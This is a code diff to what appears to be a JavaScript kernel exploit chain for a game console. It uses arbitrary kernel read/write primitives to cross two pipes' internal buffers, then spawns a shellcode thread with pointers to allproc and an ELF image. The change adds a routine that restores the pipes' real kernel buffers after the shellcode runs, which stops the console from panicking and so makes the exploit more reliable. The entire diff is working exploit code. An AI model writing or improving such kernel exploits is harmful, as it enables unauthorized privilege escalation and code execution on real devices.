@@ -414,17 +414,36 @@ async function makePipePair(p, chain) {
   return { readFd, writeFd };
 }
 
+async function pipeStructOf(krw, fd) {
+  const table = await krw.read8(krw.procFdAddr);
+  const file = await krw.read8(
+    table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride),
+  );
+  return krw.read8(file.add32(FD_ENTRY.data));
+}
+
 async function prepareShellcodePipes(krw, master, victim, log) {
-  const pipeOf = async (fd) => {
-    const table = await krw.read8(krw.procFdAddr);
-    const file = await krw.read8(
-      table.add32(FD_ENTRY.ofiles + fd * FD_ENTRY.stride),
-    );
-    return krw.read8(file.add32(FD_ENTRY.data));
-  };
+  const pipeOf = async (fd) => pipeStructOf(krw, fd);
 
   const masterPipe = await pipeOf(master.readFd);
   const victimPipe = await pipeOf(victim.readFd);
+
+  // Save the pair's real kmalloc buffers before the crossing re-points them.
+  // restoreShellcodePipes() puts them back once the shellcode thread has
+  // joined: the kernel frees pipe->buffer when the app closes, and freeing a
+  // buffer that still points at the other pipe's struct is the panic users see
+  // as "the console froze after reboot" (same discipline as the exploit pair's
+  // savePipeBuffers/restoreRealBuffers).
+  const saved = {
+    master: {
+      buffer: await krw.read8(masterPipe.add32(PIPE.buffer)),
+      size: await krw.read4(masterPipe.add32(PIPE.size)),
+    },
+    victim: {
+      buffer: await krw.read8(victimPipe.add32(PIPE.buffer)),
+      size: await krw.read4(victimPipe.add32(PIPE.size)),
+    },
+  };
 
   await krw.write4(masterPipe.add32(PIPE.count), 0);
   await krw.write4(masterPipe.add32(PIPE.in), 0);
@@ -446,6 +465,62 @@ async function prepareShellcodePipes(krw, master, victim, log) {
       " -> victim=" +
       hex(victimPipe),
   );
+  return saved;
+}
+
+/**
+ * Undo prepareShellcodePipes() once the shellcode thread has joined: put both
+ * pipes' real buffers and sizes back and zero the ring counters, so the pair
+ * "looks like an ordinary used pipe" when the app closes. Leaving the pair
+ * crossed frees an armed pipe buffer at close and panics the console.
+ *
+ * @returns {boolean} true when both buffers read back as the originals
+ */
+export async function restoreShellcodePipes(krw, master, victim, saved, log) {
+  const say = typeof log === "function" ? log : () => {};
+  if (!saved || !saved.master || !saved.victim) {
+    say("shellcode pipes: no saved buffers - cannot restore");
+    return false;
+  }
+
+  const writeU32Checked = async (address, value) => {
+    await krw.write4(address, value >>> 0);
+    return (await krw.read4(address)) >>> 0 === (value >>> 0);
+  };
+  const writePtrChecked = async (address, value) => {
+    await krw.write8(address, value);
+    const back = await krw.read8(address);
+    return back.low === value.low && back.hi === value.hi;
+  };
+
+  let ok = 0, want = 0;
+  for (const [pair, s] of [
+    [master, saved.master],
+    [victim, saved.victim],
+  ]) {
+    const pipe = await pipeStructOf(krw, pair.readFd);
+    want += 5;
+    if (await writePtrChecked(pipe.add32(PIPE.buffer), s.buffer)) ok++;
+    if (await writeU32Checked(pipe.add32(PIPE.size), s.size)) ok++;
+    for (const off of [PIPE.count, PIPE.in, PIPE.out])
+      if (await writeU32Checked(pipe.add32(off), 0)) ok++;
+  }
+
+  const masterPipe = await pipeStructOf(krw, master.readFd);
+  const victimPipe = await pipeStructOf(krw, victim.readFd);
+  const mb = await krw.read8(masterPipe.add32(PIPE.buffer));
+  const vb = await krw.read8(victimPipe.add32(PIPE.buffer));
+  const good =
+    mb.low === saved.master.buffer.low &&
+    mb.hi === saved.master.buffer.hi &&
+    vb.low === saved.victim.buffer.low &&
+    vb.hi === saved.victim.buffer.hi;
+  say(
+    good
+      ? "shellcode pipes: both real buffers restored (" + ok + "/" + want + " writes ok)"
+      : "shellcode pipes: RESTORE FAILED (" + ok + "/" + want + " writes) - closing the app may still panic",
+  );
+  return good;
 }
 
 async function spawnAndJoin(entry, args, symbols, p, chain, log) {
@@ -726,31 +801,39 @@ export async function runKexp(krw, p, chain, log, config) {
   const victim = await makePipePair(p, chain);
   if (!krw.procFdAddr)
     throw new Error("kexp: no filedesc address, the pipe bootstrap cannot run");
-  await prepareShellcodePipes(krw, master, victim, say);
+  const savedPipes = await prepareShellcodePipes(krw, master, victim, say);
 
-  const args = p.malloc(0x28);
-  for (let o = 0; o < 0x28; o += 8) p.write8(args.add32(o), 0);
-  p.write4(args.add32(0x00), master.readFd);
-  p.write4(args.add32(0x04), master.writeFd);
-  p.write4(args.add32(0x08), victim.readFd);
-  p.write4(args.add32(0x0c), victim.writeFd);
-  p.write8(args.add32(0x10), allproc);
-  p.write8(args.add32(0x18), elfBase);
-  p.write8(args.add32(0x20), elf.length);
+  try {
+    const args = p.malloc(0x28);
+    for (let o = 0; o < 0x28; o += 8) p.write8(args.add32(o), 0);
+    p.write4(args.add32(0x00), master.readFd);
+    p.write4(args.add32(0x04), master.writeFd);
+    p.write4(args.add32(0x08), victim.readFd);
+    p.write4(args.add32(0x0c), victim.writeFd);
+    p.write8(args.add32(0x10), allproc);
+    p.write8(args.add32(0x18), elfBase);
+    p.write8(args.add32(0x20), elf.length);
 
-  const { joinResult, shellcodeResult } = await spawnAndJoin(
-    entry,
-    args,
-    symbols,
-    p,
-    chain,
-    say,
-  );
-  say("join=" + hex(joinResult) + " shellcode=" + hex(shellcodeResult));
-  if (joinResult !== 0)
-    throw new Error(
-      "kexp: join returned " + hex(joinResult) + ", the shellcode crashed",
+    const { joinResult, shellcodeResult } = await spawnAndJoin(
+      entry,
+      args,
+      symbols,
+      p,
+      chain,
+      say,
     );
+    say("join=" + hex(joinResult) + " shellcode=" + hex(shellcodeResult));
+    if (joinResult !== 0)
+      throw new Error(
+        "kexp: join returned " + hex(joinResult) + ", the shellcode crashed",
+      );
 
-  return true;
+    return true;
+  } finally {
+    // The shellcode thread has joined (or failed): un-cross the pair now, so
+    // the process exit frees two ordinary pipe buffers instead of armed ones.
+    // Runs on failure too -- a crashed shellcode leaves the pair armed and
+    // that is exactly what kills the console at app close.
+    await restoreShellcodePipes(krw, master, victim, savedPipes, say);
+  }
 }
